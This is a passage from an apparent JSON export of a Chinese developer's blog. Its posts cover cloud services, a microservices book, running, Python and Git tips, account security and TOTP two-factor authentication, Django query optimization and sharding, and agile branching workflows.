的产业互联网无疑拥有巨大机会。但国内商业公司为效率付费的意愿不强，对公有服务不信任，目前 ToB 也不是一门容易的生意。\n除了互联网对整个产业的冲击，作为从业人员，我更关注到的是，互联网基础设施正在发生急剧变革。随着云服务的市场份额不断向巨头聚集，IT 蓝领时代可能真的不远了。互联网技术门槛会进一步降低，标准化的生产方式出现，催生大量体力劳动岗位。\n1.1 云服务代替了运维 传统的 IT 基础设施主要是硬件、网络设备、OS 等。工程师使用这些软硬件，需要一定的学习成本。通常，大公司会有一个运维团队，专职做服务保障。但，运维能力不是天生的，只有踩过坑，才会获得足够的成长。这是除薪资外，又一部分的成本和风险。\n运维团队是一个吃力不讨好的部门，没有功劳，只有苦劳。\n这时，云服务来了。需要服务器，就买一台云服务器；需要数据库，就买一个云数据库实例，这比自己搭建一套方便、便宜多了。同时，云服务还能提供更好的容灾容错、弹性伸缩，更好的运维服务。\n1.2 Kubernetes 释放了内核的能力 云服务已经被工业界广泛认可，并且产生了巨大价值。云服务的发展，很大程度上得益于虚拟化技术的发展。但虚拟化技术，没有解决分布式调度的问题。\n传统软件架构的基础是，一个操作系统运行在一台主机上。受限于这样的理解，需要大量工程师做优化，以适应业务流量的增长。请求的分发，资源的分配，网络的隔离\u0026hellip; 如果在单台机器上，这些工作都是由操作系统来完成。那么，为什么不将一个系统直接安装到一个集群上呢？\nKubernetes 正是这样一个系统。它可以接管很多个主机，分布式地调度资源，对于使用者却只看得见一个。我们只需要定义进程，Kubernetes 就会自动在 Pod 中运行起来。\n1.3 云编排让开发更容易 Kubernetes 解决了资源管理和调度的问题，再结合 buildpack 等构建工具，可以很好地满足部署需求。\n事实上，我们在部署一个应用时，还会依赖一些组件，比如 Nginx、Redis、其他服务等。它们作为应用的一部分，需要被配置和管理。\n服务编排提供组装、配置服务的能力。但是，让开发人员去写冗长的 YAML 配置，这很难接受。最近，看到一些云服务商，已经开始支持通过图形拖拽的方式实现 SDN、服务编排等功能，无疑大大降低了使用门槛。\n云编排给部署提供了极大的便利，让架构方案商品化，易于流通。头部云服务商，有能力输出架构方案给中小型公司，中小型公司需要做的是选择方案和一键部署，而不是设计新的架构方案。\n2. 云让构建应用更简单 我之前写过一篇博客，如何使用 Jenkins、Docker、GitLab 搭建 Django 自动化部署流程\n。搭建这样一套简单的自动化流程，我花了一天时间。\n如果用云服务，只需要半个小时：\n云数据库，我选择的是 TencentDB for MySQL 云主机，AWS 一年免费主机 云编排，Daocloud stack 第一步，创建 DevOps 流水线\n首先准备一个 GitHub 仓库，仓库中包含构建镜像的全部内容。在 Daocloud 中创建一个 DevOps 项目，选择准备好的仓库，编译镜像。（在创建应用之后，可以增加一个 stage ，用于将应用发布到自有主机）\n第二步，编排应用\n在应用平台中，创建 stack。编辑 docker-compose.yml ，使用上一步编译生成的镜像。通过环境变量的方式，将数据库配置注入应用。\n第三步，提交代码，自动编译镜像，部署应用\n接下来的事情，就非常简单了。只需要提交代码，DevOps 流水线就会被自动触发，自动部署发布。\n至此，应用就上线了。如果需要进行多实例、异地部署，只需要在 DevOps 流水线中，增加相应的原子即可。\n3. 输出即云服务 云服务实际上就是领域能力的输出。每一种服务都对应着一种解决方案，对应着一种能力的输出。\nIaaS 层输出的是虚拟化主机的能力；PaaS 层输出的是管理应用生命周期的能力；SaaS 层输出的是应用开发的能力。\n这样思考，云服务就很容易理解了。这和擅长烙饼的大爷，在路边卖大饼是一个道理，路人总不会因为肚子饿去买一整套烙饼工具。我们只需要瞄准擅长的领域，兜售经过验证的解决方案即可。\n整个软件研发周期，都是云服务成长的沃土。有管理需求、缺陷的 Tapd，云数据库，数据运营的 GrowingIO，异常监控 Sentry，日志 Datadog\u0026hellip;\n","description":"","id":390,"section":"post","tags":["博文","思考","云服务"],"title":"输出既服务","uri":"https://www.chenshaowen.com/blog/output-as-a-service.html"},{"content":"作者: [英] Sam Newman\n出版年: 2016-5\nISBN: 9787115420268\nNotes:\n主要回答了一系列关于微服务的问题。什么是微服务，微服务具有什么特点，系统是如何演化的，如何划分服务，集成、部署、测试策略。\n对整个微服务介绍比较全面，很多观点能引起我的共鸣。适合对现有项目不满，准备尝试微服务的开发者。但，即使划分了界限上下文，最后能不能采用微服务的架构，还得看是否有合适的人力配置。一个人就全栈，两个人就前后端分离，三个人再考虑微服务。\n","description":"","id":391,"section":"post","tags":["书籍","服务","架构"],"title":"微服务设计","uri":"https://www.chenshaowen.com/blog/book/microservice-design.html"},{"content":"1. 谈跑步 谈跑步时，很容易联想到村上春树的 《当我谈跑步时我谈些什么》。“ 当我谈论 XX 时我谈些什么 ”，句式被广泛引用，也说明了这本书的影响力。\n我第一次看完这本书，是好多年前的事了。现在除了标题，其他也就只记得，村上春树每天很早就起床，集中注意力几个小时，就可以完成整天的工作内容。\n实际上，我验证过，早起时，工作效率真的很高。早上天还没亮就起床，头脑特别清晰，没有其他干扰，可以很快地进入工作状态，效率甚至比晚上还要高。这种工作方式适合对时间和工作内容能自由安排的人。另一方面，早起意味着要早睡，这对现在的人来说，是一个挑战。\n但，我依然会早起。小时候，父亲每天都会六点钟起床打开店铺；念大学时，每个周末得花一个多小时乘车，去另外一所学校上课。一部分是受到家里的影响，也有一部分是所处环境的需要，早起成了一种习惯。\n刚参加工作时，早起，多出来的时间会学习一会儿，补充一点知识。之后，晚上睡得很晚，渐渐早上就没起那么早，自然也没时间做其他事情。每天起床，刷牙，坐班车上班，坐班车下班，睡觉。时间流逝得特别快，回忆却没有增加。\n今年春节过后，居住的小区旁，翻修的公园开放了。公园里面，正好有一个塑料跑道，每圈大约 300 米，让人跃跃欲试。\n2. 继续奔跑 上一次有规律地跑步，是在我本科阶段。每隔一天，我就跑 3.2 km。八条赛道，每一圈都是一个小目标，八个小目标最终构成一次跑步任务。跑步一段时间之后，我在腿上绑上了沙袋，用来增加练习强度。可能是白天上课太用力，晚上跑完步、洗个澡，坐在图书馆就想打瞌睡。虽然在图书馆，借阅了很多书，但是我认为吸收得并不好。\n这样一直坚持了 2~3 年。\n工作之后，下班时间没有那么早，晚上跑步是不可能的。早上跑步，是一个不错的选择。\n我认识几位非常热衷跑马拉松的朋友，即使是半马，只要能报上名，他们也是欣喜万分。我的目标没有那么高，只希望能出一身汗、放松一下身体。\n现在每次跑步，我都不会跑得很久，也不会让自己很累。跑得久，投入时间多，跑得累，影响工作。我更在意的是，每天能够坚持，不会造成负担，把跑步当作是一种休闲娱乐。\n3. 跑步冥想 跑步时，身体一旦进入状态，就开始机械地运动。左脚、右脚、左手、右手、一圈、两圈、、、，肢体在很熟练地重复一套动作。\n有时我会专注于呼吸，吸气、吐气，有时我会专注于脚步，一二、一二。跑步时，我常忘了时间，也不在意跑了多久。我只是会设置一个标记，提醒自己该结束了。以前在学校的操场上，有赛道，我就一圈一圈跑。现在是额头上出了很多汗，我就会回家洗澡了。\n实际上，冥想也是将注意力集中在呼吸，通过训练以提升自我的专注力。冥想与跑步，也可以结合在一起。身体在运动，脑袋不用处理日常事务，思维空间比平时更加广阔。\n在学校跑步时，我不用想待会儿去哪里上课，还有什么作业没完成，需要参加什么活动。我只用迈开双腿，脑袋里面就全是最近看过的书。读完一本书之后，我只能记住一些零星的知识片段，并不能将整个线索连贯起来。跑步时，这些知识片段就成了待加工的原材料。\n工作之后，面对的是工作目标、职业发展。个人在领域和时间的投入上，都会向职业方向倾斜。跑步时，我会想想最近重要的工作项，然后自我反省。如果，最近有阅读书籍，也会延续之前的做法，尝试用自己的逻辑转述，思考工作中的契合点。\n我认为跑步最重要的是，给了自己一段认识并反省自我的时间。在这段时间，可以忘掉一切，仿佛在以第三者的角度，审视自己与世界的关系。\n","description":"","id":392,"section":"post","tags":["博文","思考","跑步"],"title":"继续奔跑","uri":"https://www.chenshaowen.com/blog/continue-to-run.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Linux 下设置 Git 访问凭证 Windows 或 OS X 上有 keychain 工具管理账户凭证，在 Linux 系统上使用 Http/Https 协议访问 Git 仓库时，每次都需要输入账户密码。通过下面的配置，可以省略这一过程。\n新建凭证文件 1 touch ~/.git-credentials 编辑文件，添加凭证信息 1 https://{username}:{password}@git-domain.com 使凭证生效 1 git config --global credential.helper store 执行完毕，会生成 Git 配置文件 ~/.gitconfig。\ncat ~/.gitconfig [user] email = yourmail name = yourname [credential] helper = store 2. Python 列表、元组遍历速度差不多 在 IPython 中执行如下测试代码：\n1 2 3 4 5 6 7 8 9 10 import timeit a = range(9999) def test_list(): for i in a: i = i * i timeit.timeit(\u0026#39;test_list()\u0026#39;, \u0026#39;from __main__ import test_list\u0026#39;, number=1000) # 0.29664087295532227 1 2 3 4 5 6 7 8 9 10 import timeit a = tuple(range(9999)) def test_tuple(): for i in a: i = i * i timeit.timeit(\u0026#39;test_tuple()\u0026#39;, \u0026#39;from __main__ import test_tuple\u0026#39;, number=1000) # 0.3050811290740967 从测试结果看到，list、tuple 的遍历速度差不多。但经常听到 tuple 比 list 快的言论，实际上指的是创建速度。另外，它们的查找速度也差不多。\n在 CPython 中，创建 tuple 会一次性分配固定连续的内容；创建 list 会被分配两块内存，一块记录 Python Object 信息，一块用来存储数据。\n3. Python 的类构造函数 type() 1 type(name, bases, dict) 参数说明:\nname, 字符串，指定新类的名字, 赋给新类的 __name__ bases，一个 tuple，指定新类的基类，赋给新类的 __bases__ dict，字典类型，指定新类的属性，赋给新类的 __dict__ Python 作为一种动态语言，动态构建类能实现很多美妙特性、节省大量代码。\n4. Python 中的 EAFP 原则 Easier to ask for forgiveness than permission. This common Python coding style assumes the existence of valid keys or attributes and catches exceptions if the assumption proves false. This clean and fast style is characterized by the presence of many try and except statements. The technique contrasts with the 07001 common to many other languages such as C.\n举个例子：\nEAFP 风格\n1 2 3 4 try: x = my_dict[\u0026#34;key\u0026#34;] except KeyError: # handle missing key LBYL 风格\n1 2 3 4 if \u0026#34;key\u0026#34; in my_dict: x = my_dict[\u0026#34;key\u0026#34;] else: # handle missing key LBYL 需要搜索字典两次，另外，可读性也没有 EAFP 好。\n5. pipenv 应该与 pyenv 配合使用 pipenv 可以管理项目的依赖环境，隔离每一个项目。\n1 pipenv shell pipenv 还可以管理解释器，允许指定 Python 的版本。\n1 2 pipenv --python 3.6 pipenv --python 2.7.14 执行上述命令时，pipenv 首先会在系统中寻找合适的版本。如果没有找到，同时安装了 pyenv，pipenv 会自动调用 pyenv 下载对应版本的 Python 解释器。\n如果没有安装 pyenv，pipenv 仅会提示找不到匹配的版本。因此，在使用 pipenv 时，最好能配合 pyenv 使用。\n","description":"","id":393,"section":"post","tags":["博文","Tips","Python"],"title":"开发 Tips（8）","uri":"https://www.chenshaowen.com/blog/developing-tips-8.html"},{"content":"1. 安全问题日趋严重 随着互联网对生活场景的层层渗透，我们越来越依赖于各种网络 ID。这些 ID 构成了数字版的我们，是极其重要的账户资产。\n另一方面，各种账户信息泄露事件、安全事件却时有发生，CSDN、12306、华住酒店、Facebook、Twitter、Uber\u0026hellip;..不一而足。更可怕的是，这些还是被曝光的、被公开的账户信息泄露事件，冰山之下，可以还有更多的信息泄露。\n目前国内互联网，似乎更在意信息的共享，而不是相互隔离。这催生了大数据产业的持续繁荣。\n忽略个人隐私，不是互联网健康发展的方式。系统安全、信息安全应该得到足够重视。乱象丛生，野蛮生长之后，必然会迎来一个规则的建设期，安全领域在未来具有很大的发展空间。\n2. 密码设置基础知识 密码足够长，通常需要 8 位以上 密码足够复杂，包含大小写字母、数字、特殊字符 不同网站使用不同密码 定期修改密码 3. 密码管理平台 密码太复杂、太多，难以记忆，催生了用户管理账户密码的需求。\n密码管理平台，通过自动云端同步，让用户只需记住一个主密码就可随时随地、不受设备数量限制地享受密码自动填充、安全笔记、好友密码共享等功能。常见的平台有 1Password、Lastpass，它们都提供了极其强大的插件，适配 Windows、OS X、IOS、Android 等平台。\n使用这些密码管理平台，用户可以设置足够复杂的账户密码，但却不需要记忆，兼顾安全性和便捷性。\n但是，密码管理平台信息会不会被泄露呢？Lastpass 就曾经被黑客攻入。实际上，使用密码管理平台，就是将全部泄露风险集中到了密码管理平台。一旦平台的安全性得不到保障，用户将会面临巨大损失。\n4. 账户验证的原理和方法 账户验证，实际上就是要证明你的东西是你的。常见的方式有：\n私密信息 一段别人不知道的信息。比如，密码、图片、文件、URL、最近购物、家庭住址等都可以作为验证载体。\n随身物品 只有你才会有的物理实体。比如，U 盾、电子密保卡、IC 卡、手机、身份证等。相比较与私密信息，随时物品的安全性提高了很多，基本保证了唯一性。\n生理特征 一段只有你才具有的生物信息片段。比如，指纹、虹膜、DNA 等。\n账户验证，本质上，只是在比较两段信息是否一致，但需要平衡便捷和安全两个核心。便捷的验证方法要求方便记忆、方便携带，随时可达，遗失能补办。安全的验证方法要求更复杂、更长的验证信息。\n5. 什么是二次验证 Two-factor authentication，简称 2FA，是在普通验证的基础上，再添加一层安全保护。\n开启二次验证之后，账户登陆时，要求额外输入一个动态生成的随机字符串。\n目前，支持二次验证的网站越来越多，显示验证码的方式也越来越多。短信、邮件、软 Token 等，都是很常见的途径。\n目前，比较主流的二次验证策略是，基于时间戳算法的一次性密码，Time-based One-time Password，简称 TOTP。常见的二次验证软件，Google Authenticator、Authy 等采用的就是 TOTP 算法。\nTOTP 算法的基本原理是：服务器端生成一个密钥，然后发给手机端。手机端使用密钥和时间戳生成一个哈希值。在一段时间内，手机端与服务器端使用相同密钥生成的哈希值一致。哈希值，计算公式：\n1 TC = floor((unixtime(now) − unixtime(T0)) / TS) unixtime(now)，是当前 Unix 时间戳 unixtime(T0))，约定的起始时间，默认为 0 TS，有效期的时间长度 6. 参考 http://www.ruanyifeng.com/blog/2017/11/2fa-tutorial.html ","description":"","id":394,"section":"post","tags":["博文","安全","验证"],"title":"从账户安全到二次验证","uri":"https://www.chenshaowen.com/blog/from-account-security-to-secondary-verification.html"},{"content":" 本文主要提供了 Django 字段、查询方面的优化建议，同时还介绍了一个 Django-silk 性能分析工具。希望对你开发高性能的 Django 工程有所帮助。\n1. DBA 的建议 1.1 表字段设计 避免出现 null 值，null 值难以查询优化且占用额外的索引空间 尽量使用 INT 而非 BIGINT，尽可能准确描述字段 使用枚举或整数，替代字符串类型 使用 TIMESTAMP 替代 DATETIME 单表字段不要超过 20 使用整型存储 IP 1.2 索引 在 Where 和 Order By 操作上建立索引 值分布稀少的字段不适合建立索引 字符串最好不要作为主键 在应用层保证 UNIQUE 特性 1.3 SQL 查询 不要做列运算，可能导致表扫描 避免 %xxx 式查询 减少 JOIN 操作 使用 LIMIT 拿取分页数据，而不要拿全部 2. Django Model 建议 ORM 与 DB 的对应关系：\nORM DB 类 数据表 对象 数据行 属性 字段 字段索引 使用 db_index=True 添加索引\n1 title = models.CharField(max_length=255, db_index=True) 联合索引 利用组合在一起的字段名字建立索引\n1 2 class Meta: index_together = [\u0026#39;field_name_1\u0026#39;, \u0026#39;field_name_2\u0026#39;] 联合唯一索引 组合在一起的字段名称唯一，可以是多个元组，也可以是单个元组。\n1 2 3 class Meta: # 多元组 unique_together = ((\u0026#39;field_name_1\u0026#39;, \u0026#39;field_name_2\u0026#39;),) 1 2 3 class Meta: # 单元组 unique_together = (\u0026#39;field_name_1\u0026#39;, \u0026#39;field_name_1\u0026#39;) 3. 查询建议 3.1 select_related 解决外键关系 N + 1 查询 select_related 通过多表 join 关联查询，一次性获取所有数据，减少查询次数。这样讲，可能还是不够明白，看看下面的例子：\n1 2 3 4 5 6 7 8 class Country(models.Model): name = models.CharField(max_length=32) def __unicode__(self): return self.name class House(models.Model): country = models.ForeignKey(Country, related_name=\u0026#39;houses\u0026#39;) 如果需要查询某个 country 的房屋信息，然后序列化处理。通常情况，可能会这样写：\n1 2 3 4 5 houses = House.objects.filter(country=country) for item in houses: # 会产生新的数据库查询操作 country_name = item.country.name ... 由于 Django 的 Lazy 特性，在执行 filter 操作时，并不会将 country 的 name 字段取出，而是在使用时，实时查询。这样会产生大量的数据库查询操作。\n使用 select_related 可以避免这种情况，一次性将外键值取出。\n1 2 3 4 5 houses = House.objects.filter(country=country).select_related(\u0026#39;country\u0026#39;) for item in houses: # 不会产生新的数据库查询操作 country_name = item.country.name ... 3.2 prefetch_related 解决多对多关系 N + 1 查询 prefetch_related 主要针对一对多、多对多关系进行优化。看一个例子：\n1 2 3 4 5 6 7 8 9 10 class Tag(models.Model): name = models.CharField(max_length=32) class Article(models.Model): title = models.CharField(max_length=32) tags = models.ManyToManyField( to=\u0026#34;Tag\u0026#34;, through=\u0026#39;Article2Tag\u0026#39;, through_fields=(\u0026#39;article\u0026#39;, \u0026#39;tag\u0026#39;), ) 如果需要查询指定 Article 的 Tag 信息，然后序列化处理。通常情况，可能会这样写：\n1 2 3 4 articles = Article.objects.filter(id__in=(1,2)) for item in articles: # 会产生新的数据库查询操作 item.tags.all() 同样，上面的查询会产生 N + 1 问题，导致大量 IO 消耗。如果使用 prefetch_related，可以避免在循环中持续进行数据库查询操作。\n1 2 3 4 articles = Article.objects.prefetch_related(\u0026#34;tags\u0026#34;).filter(id__in=(1,2)) for item in articles: # 不会产生新的数据库查询操作 item.tags.all() 3.3 仅查询需要的数据 默认情况下， Django 查询时会提取 ORM 中的全部字段。但是在使用场景中，我们仅关注某些字段。为了节省查询多余字段的时间，可以使用 Django 提供的这两个函数：\ndefer()，指定哪些字段不要立即加载 1 Entry.objects.defer(\u0026#39;headline\u0026#39;, \u0026#39;body\u0026#39;) only()，指定立即加载哪些字段，其他忽略 1 Entry.objects.only(\u0026#34;body\u0026#34;, \u0026#34;rating\u0026#34;).only(\u0026#34;headline\u0026#34;) defer 和 only 的使用很灵活，可以链式延时加载，也可以链式逐步加载，还可以混合使用。\n4. Django-silk 性能测试工具 Django-silk 是一个 Django 的性能分析工具，提供 Django 的性能分析报告、API 的 SQL 语句、执行时间等。\n安装 1 pip install django-silk==2.0.0 配置 在 settings.py 中添加如下配置：\n1 2 3 4 5 6 7 8 9 10 MIDDLEWARE_CLASSES = ( ... \u0026#39;silk.middleware.SilkyMiddleware\u0026#39;, ... ) INSTALLED_APPS = ( ... \u0026#39;silk\u0026#39; ) 在 urls.py 中添加如下配置：\n1 urlpatterns += [url(r\u0026#39;^silk/\u0026#39;, include(\u0026#39;silk.urls\u0026#39;, namespace=\u0026#39;silk\u0026#39;))] 创建数据表 1 python manage.py migrate 运行工程一段时间后，查看性能分析报告 总览\nAPI 详情\n5. 参考 http://python.jobbole.com/88971/ https://www.zhihu.com/question/19719997 https://docs.djangoproject.com/en/2.1/ref/models/querysets/ ","description":"","id":395,"section":"post","tags":["博文","数据库","优化","性能","Django"],"title":"Django 性能之数据库查询优化","uri":"https://www.chenshaowen.com/blog/database-query-optimization-of-django-performance.html"},{"content":"1. 碰到的问题 前端请求量大，并发高，访问速度慢，瓶颈主要表现在：\n单表大 单库大 网络 IO 慢 磁盘 IO 慢 网络、磁盘 IO 优化，主要依靠硬件升级。理论上，数据库对单库、单表的大小没有限制，但是过大的单库、单表会导致更多的请求落到单机上，给 IO 造成压力。\n理想情况是，通过增加机器，能不断地增加系统并发能力。当 MySQL 单表数据量达到百万级别时，我们就应该开始存储相关的知识，以应对可能的问题。\n2. 数据库架构设计的三种模式 为了解决数据库的性能问题，除了使用性能更好的硬件之外，另外一个思路就是从架构方面考虑。将一个数据库切分成多个部分放到不同的数据库上，从而缓解单一数据库的性能问题。\n数据库构架设计中主要有 Shared Everthting、Shared Nothing、和 Shared Disk。通常说的 Sharding，实际上指的就是 Shared Nothing，通过增加处理单元来扩展处理能力。\n2.1 Shared Everthting 通常是单个主机，完全共享 CPU、Memory、IO，并行处理能力差。例如，SQL Server。\n2.2 Shared Disk 各个处理单元使用私有的 CPU、Memory，共享 IO。可以通过增加节点来提高并行处理能力，直到存储接口达到瓶颈为止。例如 Oracle Rac。\n2.3 Shared Nothing 各个处理单元都有自己私有的 CPU、Memory、IO。各个处理单元之间，通过协议通信，例如：Hadopp。\n3. 拆分策略 3.1 垂直拆分 将关系紧密的数据聚合在一起，拆分到不同的 Server。\n分表：基于字段。 分库：基于业务。 3.2 水平拆分 将同类数据，拆分到不同的 Server。\n分表：基于某种规则（hash 等）。 分库：基于表结构相同，但数据集不同。 拆分后的问题\n主键生成（唯一 ID） 数据的路由（分布、节点伸缩） 事务支持。由数据库本身，转向了应用层。 跨库 Join。由应用层组装。 count、group by、order by 等聚合 在生产环境中，通常会混合垂直、水平拆分实施。将原有数据库切分为矩阵一样，可以根据需要，无限拆分。\n4. Django 中的 Sharding 4.1 分表方案 Django 分表方案，主要是自定义 Model 的 db_table 属性指定 ORM 操作的表名。\n下面的例子中，使用一个 Proxy 类，通过取余算法，将不同用户的数据分配到不同表中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from django.db import models # 表分片的数量 SHARD_TABLE_NUMBER = 2 class UserProxy(models.Model): @classmethod def get_sharding_model(cls, uid=None): piece = uid % SHARD_TABLE_NUMBER class Meta: db_table = \u0026#39;user_%s\u0026#39; % piece attrs = { \u0026#39;__module__\u0026#39;: cls.__module__, \u0026#39;__doc__\u0026#39;: \u0026#39;using user_%s table\u0026#39; % piece, \u0026#39;Meta\u0026#39;: Meta } return type(str(\u0026#39;User%s\u0026#39; % piece), (cls, ), attrs) username = models.CharField(max_length=255) class Meta: abstract = True User2 = UserProxy.get_sharding_model(uid=2) 需要考虑的新问题：\n分片数量改变后，如何保证一致性 新建数据如何选择表 如何同步表结构 4.2 分库方案 Django 原生支持分库，只需要在 settings.py 文件中，新增数据库配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 DATABASES = { \u0026#39;default\u0026#39;: { \u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;, \u0026#39;NAME\u0026#39;: \u0026#39;db_name1\u0026#39;, \u0026#39;USER\u0026#39;: \u0026#39;db_user1\u0026#39;, \u0026#39;PASSWORD\u0026#39;: \u0026#39;db_password1\u0026#39;, \u0026#39;HOST\u0026#39;: \u0026#39;127.0.0.0\u0026#39;, \u0026#39;PORT\u0026#39;: 3306, }, \u0026#39;mydb2\u0026#39;: { \u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;, \u0026#39;NAME\u0026#39;: \u0026#39;db_name2\u0026#39;, \u0026#39;USER\u0026#39;: \u0026#39;db_user2\u0026#39;, \u0026#39;PASSWORD\u0026#39;: \u0026#39;db_password2\u0026#39;, \u0026#39;HOST\u0026#39;: \u0026#39;127.0.0.0\u0026#39;, \u0026#39;PORT\u0026#39;: 3306, } } 有两种使用方法：\n使用 using，代码入侵比较强。 1 Author.objects.using(\u0026#39;mydb\u0026#39;).all() 使用 Database Router 第一步，编写 Database Router，指定匹配的 app_label 使用某个 DB。\n需要实现 db_for_read、db_for_write、allow_relationy 以及 allow_migrate 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class MyRouter(object): def db_for_read(self, model, **hints): if model._meta.app_label == \u0026#39;myapp_label\u0026#39;: return \u0026#39;mydb2\u0026#39; return None def db_for_write(self, model, **hints): pass def allow_relation(self, obj1, obj2, **hints): pass def allow_migrate(self, db, model): pass 第二步，在 settings.py 文件中配置 Database Router。\n1 DATABASE_ROUTERS = [\u0026#39;db_router.MyRouter\u0026#39;] 第三步，配置 Model 的 app_label\n1 2 3 4 5 class MyModel(models.Model): pass class Meta: app_label = \u0026#39;myapp_label\u0026#39; ","description":"","id":396,"section":"post","tags":["博文","Django","数据库","Sharding","性能","分库","分表"],"title":"Django 性能之分库分表","uri":"https://www.chenshaowen.com/blog/sub-db-and-table-of-django-performance.html"},{"content":"1. 敏捷开发是什么 在传统的软件研发模型中，从提出需求到最后交付，时间周期较长。瀑布模型遵循需求分析、设计、编码、集成、测试、维护六个步骤进行。一旦需求发生变化，不仅浪费前期投入，还不易于调整。\n敏捷开发是一种应对快速变化的需求的软件开发能力。特别是互联网软件，前期设计不可能十分完美，在研发的过程中，会不断地调整、优化。\n敏捷开发是面向交付、面向协作的。相较于主张完善的设计、文档、流程规范，敏捷开发强调的是持续交付，让目标更早得到验收，让缺陷更早暴露。\n在实践过程中，我们需要保持 1-2 周的迭代周期。过长的迭代周期，排期评估通常是不准确的，容易导致延期。同时，较长的迭代周期，意味着复杂的功能。一次迭代将复杂功能引入主版本，不是一个好主意。通过拆分功能，能有效降低问题的复杂度，提高软件质量。\n另一方面，需求方、设计方、开发方还需要时刻了解进度。1-2 周的迭代，提供的是一个短期的目标，无法具体到每天的工作内容。建议，负责人每天能组织一次站立晨会，相关人员能花 2 分钟汇报进度，反馈遇到的问题。会后，主要负责人，统一协商解决问题，以保持项目推进。\n针对这种快速迭代、持续交付的特点，我们需要寻找合适的分支开发模型。如果是几个人的项目团队，我推荐的是主干集成、分支发布的开发模式。版本管理软件推荐使用 Git，如果使用 SVN，建议转向 Git。这里有一篇博客，可以参考：从 GitLab 推送代码到 SVN 仓库。\n2. 特征开发，主干集成，分支发布 特征开发，就是每个小的功能，都新建一个特征分支进行开发。基于特征开发，能够保障各个特征的独立性，允许并行开发特征。同时，未完成的特征，也不会影响主干分支。 主干集成，就是尽可能早地将代码合并到主分支上，在主分支上进行持续集成。 假设每个迭代有 N 个功能，如果这些功能在同一天被合并到主干分支，交叉验证这些功能是否符合预期，需要的工作量是 N ^ 2 级别。但是，如果这些功能，开发自测完毕后，立即发起 MR/PR 流程，合并到主干分支。N 个功能，合并成本会下降到 N 级别。\n尽可能早地发起合并请求，能将自己的修改，尽快地告知其他开发者。在开发过程中，其他开发者，就能解决大部分的冲突。\n分支发布，就是每次发布都新建一个分支，而不是发布主干分支。 假设现在需要发行 2.1 版本。首先，基于主干分支，创建发布分支 2.1，在 2.1 分支上进行测试，并将缺陷回归到主干分支。验收通过之后，在 2.1 分支上打上 Tag 2.1.0，对外进行发布。\n发布之后，如果 Tag 2.1.0 版本有缺陷，需要在 2.1 分支上进行修复，然后回归缺陷到主干分支，打上 Tag 2.1.1，继续发行版本。\n分支发布的好处，就是让发布的版本可以追溯，允许开发者对发行版本进行修复，持续发布。另一方面，发布分支不会影响新特性的开发，也不会被主干集成干扰。\n3. 测试决定了敏捷开发的速度 没有质量的交付是没有价值的。\n敏捷开发过程中，测试是持续集成中的重要环节。测试既是目标，驱动开发人员去达成，也是交付的凭证，是给项目质量的背书。\n测试应该整合到研发流程，贯穿整个项目过程。单元测试，API 测试，集成测试，功能测试，不同的测试阶段可以发现着不同粒度的问题。\n在实践过程中，我们鼓励将测试左移。参照测试金字塔，尽可能多地写单元测试，能够获得较好的效果。在团队中，测试/开发比通常很低。由开发人员写单元测试，测试人员进行集成测试、功能测试比较合理。\n在 MR/PR 流程中，添加 CI 流水线，自动执行测试用例，辅助验证功能，也是事半功倍的实践。\n","description":"","id":397,"section":"post","tags":["博文","分支","敏捷","流程","测试"],"title":"敏捷开发之研发流程","uri":"https://www.chenshaowen.com/blog/r-and-d-process-of-agile-development.html"},{"content":"1. 认知一致 在大的组织中，我们可以将小团队理解为一个微服务。\n早在 1967 年，康威提出了微服务的概念。康威认为任何组织在设计一套系统时，所交付的设计方案在结构上都与该组织的沟通结构保持一致。\n在开发复杂系统时，我们通常会对系统进行模块拆分。一方面，个体能解决的问题难度有限，另一方面，个体之间具有一定差异。招聘更优质的工程师，意味着更大的成本。通过模块拆分，能够有效降低问题难度、节约成本。\n每个模块都需要一定数量的工程师，工程师聚集在一起，形成一个团队。这样的团队，只专注于负责的模块，而不必考虑其他，以达到问题复杂度的收敛。\n从整体来看，总的架构师决定了如何划分模块，各个子模块的存在决定了需要更小一级的组织，以此递归。从小团队来看，内部可以自治，任意调整、优化，但是对外必须保证稳定。从个人来看，负责的是具体的事务，这些事务聚合在一起，保障上一级组织的正常运行。\n只有理解了组织，认识到组织的职责，我们的决策才具有统一的准绳。这话没有什么异议，当然也没有什么价值。问题的关键是，组织的成员对组织的认识，是不是能够保持一致，是不是能够更贴近上一级组织。\n从技术服务业务的角度看，加强同级成员对组织的认识水平，是有必要的。\n2. 工具链一致 在团队中，统一开发环境不是一件容易的事，否则，也不会有 Vim 和 Emacs 之争。\n但是，不同的操作系统、不同的编辑器、不同的公共组件都会给交流带来麻烦。新来了实习生、项目交际、重装了系统、更换了电脑\u0026hellip;，都需要花费时间重新搭建开发环境。即使每次都沉淀文档，也很难覆盖全部场景，还需要更新维护文档。\n可以使用 Vagrant、Docker、VirtualBox 等虚拟化技术，屏蔽环境差异，构建统一的开发环境。\n最近，我也对开发环境进行了一次调整。之前，一直使用的是 Windows 本地搭建开发环境，也尝试过 Docker，但是都不太方便。Windows 需要配合 MINGW，Docker 需要配合 VirtualBox，但是都不能模拟线上运行环境。\n现在，我采用的是使用虚拟机在 CentOS 上进行开发。同时，将虚拟机保存在网盘中，同步到线上，在各个开发机上进行同步。\n更进一步，团队中，使用的工具链也应该尽量保持一致。\n","description":"","id":398,"section":"post","tags":["博文","思考","团队","研发"],"title":"打造一致性的团队","uri":"https://www.chenshaowen.com/blog/build-an-overall-team.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Python2 和 Python3 中的异常处理 Python2，Python3 都支持的两种方式：\n带参数 1 2 except （ExceptionType） as Argument: # 访问 Argument 不带参数 1 except ExceptionType： 仅 Python2 支持的方式：\n1 2 except ExceptionType, Argument: # 访问 Argument 2. Django 中的 get_object_or_404 和 get_queryset get_object_or_404 通过使用 get 获取对象，否则返回 404\n1 2 3 4 5 6 7 8 9 from django.shortcuts import get_object_or_404 from django.forms.models import model_to_dict from django.http import JsonResponse from .models import Fruit def filter404(request): obj = get_object_or_404(Fruit, title=\u0026#39;aa\u0026#39;) return JsonResponse(model_to_dict(obj)) 使用 get_queryset 可以全局的定制查询行为，包括 admin\n1 2 3 class 